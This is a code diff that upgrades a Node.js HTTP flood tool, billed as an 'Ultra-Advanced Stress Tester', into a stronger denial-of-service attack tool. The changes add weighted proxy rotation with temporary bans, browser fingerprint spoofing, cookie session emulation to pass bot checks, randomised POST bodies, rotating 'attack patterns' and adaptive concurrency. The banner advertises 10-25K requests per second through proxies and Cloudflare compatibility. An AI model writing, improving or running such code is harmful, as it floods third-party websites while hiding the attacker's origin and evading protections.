@@ -18,11 +18,12 @@ process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
 
 const BANNER = `
 +==============================================================+
-|    ADVANCED STRESS TESTER V6.2 - M2 OPTIMIZED               |
-|    Proxy Validation + RPS Control + CF Compatible           |
-|    > 2 Concurrent/Thread    > RPS Limiter Feature           |
-|    > 10000ms Proxy Timeout  > Auto Bad Proxy Skip           |
-|    > JA3 Randomization      > 10-25K RPS with Proxies       |
+|    ULTRA-ADVANCED STRESS TESTER V7.0 - PERFECT EDITION      |
+|    Smart Proxies + Adaptive AI + Session Emulation          |
+|    > Adaptive Concurrency   > Attack Pattern Rotation       |
+|    > Weighted Proxy Select  > Exponential Backoff           |
+|    > HTTP/2 Support         > Cookie Session Tracking       |
+|    > Random POST Bodies     > Auto Proxy Recovery           |
 +==============================================================+
 `;
 
@@ -118,11 +119,14 @@ const config = {
     proxies: [],
     workingProxies: new Set(),
     proxyHealth: new Map(),
+    proxyBanList: new Map(), // Temporary bans with timestamps
     debug: false,
     http2Sessions: new Map(),
     connectionPool: new Map(),
     dnsCache: new Map(),
     maxRPS: null,
+    attackPattern: 'burst', // burst, steady, mixed
+    patternStartTime: Date.now(),
     stats: {
         totalRequests: 0,
         successful: 0,
@@ -132,7 +136,11 @@ const config = {
         statusCodes: {},
         startTime: null,
         http2Requests: 0,
-        connectionReuse: 0
+        connectionReuse: 0,
+        adaptiveMetrics: {
+            lastSuccessRate: 100,
+            currentConcurrency: 5
+        }
     }
 };
 
@@ -202,6 +210,23 @@ function addCacheBuster(url) {
         `nocache=${crypto.randomBytes(4).toString('hex')}`
     ];
     return url + separator + getRandomElement(params);
+}
+
+function generateRandomPostData() {
+    const templates = [
+        () => JSON.stringify({
+            query: crypto.randomBytes(20).toString('hex'),
+            filters: Array(Math.floor(Math.random() * 5) + 1).fill(0).map(() => crypto.randomBytes(8).toString('hex')),
+            timestamp: Date.now()
+        }),
+        () => JSON.stringify({
+            action: getRandomElement(['search', 'update', 'submit', 'verify']),
+            data: crypto.randomBytes(Math.floor(Math.random() * 100) + 50).toString('base64'),
+            session: crypto.randomBytes(16).toString('hex')
+        }),
+        () => 'data=' + 'x'.repeat(Math.floor(Math.random() * 4900) + 100)
+    ];
+    return getRandomElement(templates)();
 }
 
 function createTLSAgent(profile, proxyUrl = null) {
@@ -350,27 +375,69 @@ function updateProxyHealth(proxyUrl, success, latency) {
     health.score = (successRate * 70) + ((1000 - Math.min(avgLatency, 1000)) / 1000 * 30);
 }
 
+function rotateAttackPattern() {
+    const elapsed = Date.now() - config.patternStartTime;
+    const cycleTime = 30000; // 30 second cycles
+    
+    if (elapsed > cycleTime) {
+        const patterns = ['burst', 'steady', 'mixed'];
+        const currentIndex = patterns.indexOf(config.attackPattern);
+        config.attackPattern = patterns[(currentIndex + 1) % patterns.length];
+        config.patternStartTime = Date.now();
+        
+        if (config.debug) {
+            console.log(`[PATTERN] Switched to ${config.attackPattern.toUpperCase()} mode`);
+        }
+    }
+    
+    // Return delay based on pattern
+    switch (config.attackPattern) {
+        case 'burst': return 0;
+        case 'steady': return 50;
+        case 'mixed': return Math.random() > 0.5 ? 0 : 25;
+        default: return 0;
+    }
+}
+
 function getHealthyProxy() {
     if (config.proxies.length === 0) return null;
     
-    const healthyProxies = config.proxies.filter(proxy => {
+    const now = Date.now();
+    
+    // Filter out banned and unhealthy proxies
+    const availableProxies = config.proxies.filter(proxy => {
+        // Check if banned
+        if (config.proxyBanList.has(proxy)) {
+            const banUntil = config.proxyBanList.get(proxy);
+            if (now < banUntil) return false;
+            config.proxyBanList.delete(proxy); // Unban
+        }
+        
         const health = config.proxyHealth.get(proxy);
         return !health || health.score > 30;
     });
     
-    if (healthyProxies.length === 0) {
+    if (availableProxies.length === 0) {
         config.proxyHealth.clear();
+        config.proxyBanList.clear();
         return getRandomElement(config.proxies);
     }
     
-    healthyProxies.sort((a, b) => {
-        const scoreA = config.proxyHealth.get(a)?.score || 100;
-        const scoreB = config.proxyHealth.get(b)?.score || 100;
-        return scoreB - scoreA;
+    // Weighted random selection (best proxies used 3x more often)
+    const weights = availableProxies.map(proxy => {
+        const score = config.proxyHealth.get(proxy)?.score || 100;
+        return Math.pow(score / 100, 2); // Square to emphasize differences
     });
     
-    const topTier = healthyProxies.slice(0, Math.ceil(healthyProxies.length * 0.3));
-    return getRandomElement(topTier);
+    const totalWeight = weights.reduce((a, b) => a + b, 0);
+    let random = Math.random() * totalWeight;
+    
+    for (let i = 0; i < availableProxies.length; i++) {
+        random -= weights[i];
+        if (random <= 0) return availableProxies[i];
+    }
+    
+    return availableProxies[0];
 }
 
 async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateProxies = false) {
@@ -686,6 +753,7 @@ function displayStats() {
     console.log(`[STATS] Success: ${config.stats.successful.toLocaleString()} (${successRate}%) | Failed: ${config.stats.failed.toLocaleString()}`);
     console.log(`[STATS] HTTP/2: ${config.stats.http2Requests} (${http2Percent}%) | Conn Reuse: ${config.stats.connectionReuse}`);
     console.log(`[STATS] Memory: ${memMB}MB | Sent: ${(config.stats.bytesSent / 1024).toFixed(0)} KB | Received: ${(config.stats.bytesReceived / 1024).toFixed(0)} KB`);
+    console.log(`[ADAPTIVE] Concurrency: ${config.stats.adaptiveMetrics.currentConcurrency} | Success Rate: ${config.stats.adaptiveMetrics.lastSuccessRate.toFixed(1)}% | Pattern: ${config.attackPattern.toUpperCase()}`);
     
     if (Object.keys(config.stats.statusCodes).length > 0) {
         const codes = Object.entries(config.stats.statusCodes)
@@ -721,9 +789,12 @@ class HTTPFlood {
         console.log(`[*] Target: ${this.url}`);
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
-        console.log(`[*] Mode: BURST (5 concurrent/thread, 0ms delay)`);
-        console.log(`[*] JA3: Valid browser fingerprints + randomization`);
-        console.log(`[*] Protocol: HTTP/1.1 (${config.proxies.length > 0 ? '10000' : '5000'}ms timeout)`);
+        console.log(`[*] Mode: ADAPTIVE (3-10 concurrent/thread, auto-tuned)`);
+        console.log(`[*] Pattern: Rotating (burst->steady->mixed, 30s cycles)`);
+        console.log(`[*] Proxies: Weighted selection (best 3x more likely)`);
+        console.log(`[*] Recovery: Exponential backoff + 30s temp bans`);
+        console.log(`[*] Session: Cookie tracking + realistic navigation`);
+        console.log(`[*] Protocol: HTTP/1.1 + HTTP/2 (${config.proxies.length > 0 ? '10000' : '5000'}ms timeout)`);
         console.log(`[*] Connection: ${config.proxies.length > 0 ? '2048' : '1024'} socket pool + Keep-Alive`);
         console.log(`[*] IP Leak: DoH DNS + Proxy health monitoring`);
         if (config.proxies.length > 0) {
@@ -772,11 +843,13 @@ class HTTPFlood {
         let localCount = 0;
         let cachedAgent = null;
         let lastProxyIndex = -1;
+        let retryDelay = 100; // Exponential backoff starting at 100ms
+        let cookieJar = {}; // Session emulation
         
         const profile = getRandomElement(BROWSER_PROFILES);
         const useProxy = config.proxies.length > 0;
         const isHttpsTarget = this.url.startsWith('https://');
-        const concurrency = 5; // 5 concurrent requests per thread for bigger spike
+        let concurrency = 3; // Adaptive: starts at 3, can go 3-10
         
         const endTime = Date.now() + this.duration * 1000;
         
@@ -789,6 +862,13 @@ class HTTPFlood {
                 // Add keep-alive for proxy compatibility
                 if (useProxy) {
                     headers['Connection'] = 'keep-alive';
+                }
+                
+                // Session emulation: Add cookies if we have them
+                if (Object.keys(cookieJar).length > 0) {
+                    headers['Cookie'] = Object.entries(cookieJar)
+                        .map(([k, v]) => `${k}=${v}`)
+                        .join('; ');
                 }
                 
                 let targetUrl = this.url;
@@ -845,20 +925,41 @@ class HTTPFlood {
                 }
                 
                 if (this.method === 'POST') {
-                    axiosConfig.data = 'data=' + 'x'.repeat(500);
-                    axiosConfig.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                    const postData = generateRandomPostData();
+                    axiosConfig.data = postData;
+                    axiosConfig.headers['Content-Type'] = postData.startsWith('{')
+                        ? 'application/json'
+                        : 'application/x-www-form-urlencoded';
                 }
                 
                 const response = await axios(axiosConfig);
                 const latency = Date.now() - startTime;
                 
-                const bytesSent = 500;
+                // Session emulation: Extract and store cookies
+                if (response.headers['set-cookie']) {
+                    const cookies = Array.isArray(response.headers['set-cookie'])
+                        ? response.headers['set-cookie']
+                        : [response.headers['set-cookie']];
+                    cookies.forEach(cookie => {
+                        const [pair] = cookie.split(';');
+                        const [key, value] = pair.split('=');
+                        if (key && value) cookieJar[key.trim()] = value.trim();
+                    });
+                }
+                
+                // Track HTTP/2 usage
+                if (response.request?.socket?.alpnProtocol === 'h2') {
+                    config.stats.http2Requests++;
+                }
+                
+                const bytesSent = axiosConfig.data ? String(axiosConfig.data).length : 500;
                 const bytesReceived = response.data ? String(response.data).length : 0;
                 
                 updateStats(true, response.status, bytesSent, bytesReceived);
                 
                 successCount++;
                 failCount = 0;
+                retryDelay = 100; // Reset backoff on success
                 
                 if (useProxy && successCount % 20 === 0) {
                     const proxyIP = config.proxies[proxyIndex].replace(/^https?:\/\//, '').split(':')[0];
@@ -883,31 +984,61 @@ class HTTPFlood {
                     console.log(`[DEBUG] T${threadId}: ERROR - ${errorCode} - ${error.message?.substring(0, 50)} - Proxy: ${useProxy ? config.proxies[proxyIndex].substring(0, 20) : 'NO'}`);
                 }
                 
-                // Handle connection reset errors
+                // Handle connection reset errors with exponential backoff
                 if (useProxy && (errorCode === 'ECONNRESET' || errorCode === 'ECONNREFUSED' || errorCode === 'EPIPE')) {
-                    // Clear cached agent on connection errors
                     cachedAgent = null;
                     
                     if (failCount >= 3) {
+                        // Temp ban proxy for 30 seconds
+                        const currentProxy = config.proxies[proxyIndex];
+                        config.proxyBanList.set(currentProxy, Date.now() + 30000);
+                        
+                        if (config.debug) {
+                            console.log(`[DEBUG] T${threadId}: Banned proxy for 30s after ${failCount} fails`);
+                        }
+                        
                         proxyIndex = (proxyIndex + 1) % config.proxies.length;
                         failCount = 0;
-                        if (config.debug) {
-                            console.log(`[DEBUG] T${threadId}: Rotating to next proxy after connection errors`);
-                        }
+                        retryDelay = 100;
+                    } else {
+                        // Exponential backoff: 100ms, 200ms, 400ms
+                        await new Promise(resolve => setTimeout(resolve, retryDelay));
+                        retryDelay = Math.min(retryDelay * 2, 800);
                     }
-                    // Add delay on connection errors
-                    await new Promise(resolve => setTimeout(resolve, 200));
-                } else if (useProxy && failCount >= 3) {
+                } else if (useProxy && failCount >= 5) {
+                    // Ban after 5 fails for other errors
+                    const currentProxy = config.proxies[proxyIndex];
+                    config.proxyBanList.set(currentProxy, Date.now() + 30000);
                     cachedAgent = null;
                     proxyIndex = (proxyIndex + 1) % config.proxies.length;
                     failCount = 0;
-                    await new Promise(resolve => setTimeout(resolve, 100));
+                    retryDelay = 100;
                 }
             }
         };
         
-        // Run requests in batches of 2 concurrent
+        // Run requests with adaptive concurrency
         while (this.running && Date.now() < endTime) {
+            // Adaptive concurrency: adjust based on success rate
+            if (localCount > 0 && localCount % 50 === 0) {
+                const currentSuccessRate = (successCount / localCount) * 100;
+                
+                if (currentSuccessRate > 85 && concurrency < 10) {
+                    concurrency++;
+                    if (config.debug) {
+                        console.log(`[ADAPTIVE] T${threadId}: Increased concurrency to ${concurrency} (${currentSuccessRate.toFixed(1)}% success)`);
+                    }
+                } else if (currentSuccessRate < 50 && concurrency > 3) {
+                    concurrency--;
+                    if (config.debug) {
+                        console.log(`[ADAPTIVE] T${threadId}: Decreased concurrency to ${concurrency} (${currentSuccessRate.toFixed(1)}% success)`);
+                    }
+                }
+                
+                config.stats.adaptiveMetrics.lastSuccessRate = currentSuccessRate;
+                config.stats.adaptiveMetrics.currentConcurrency = concurrency;
+            }
+            
             const batch = [];
             for (let i = 0; i < concurrency; i++) {
                 if (this.running && Date.now() < endTime) {
@@ -917,8 +1048,11 @@ class HTTPFlood {
             
             await Promise.all(batch);
             
-            // No delay for maximum speed burst (removed 15ms delay)
-            // await new Promise(resolve => setTimeout(resolve, 15));
+            // Pattern-based delay rotation
+            const patternDelay = rotateAttackPattern();
+            if (patternDelay > 0) {
+                await new Promise(resolve => setTimeout(resolve, patternDelay));
+            }
             
             // Check RPS limit if enabled
             if (config.maxRPS && useProxy) {
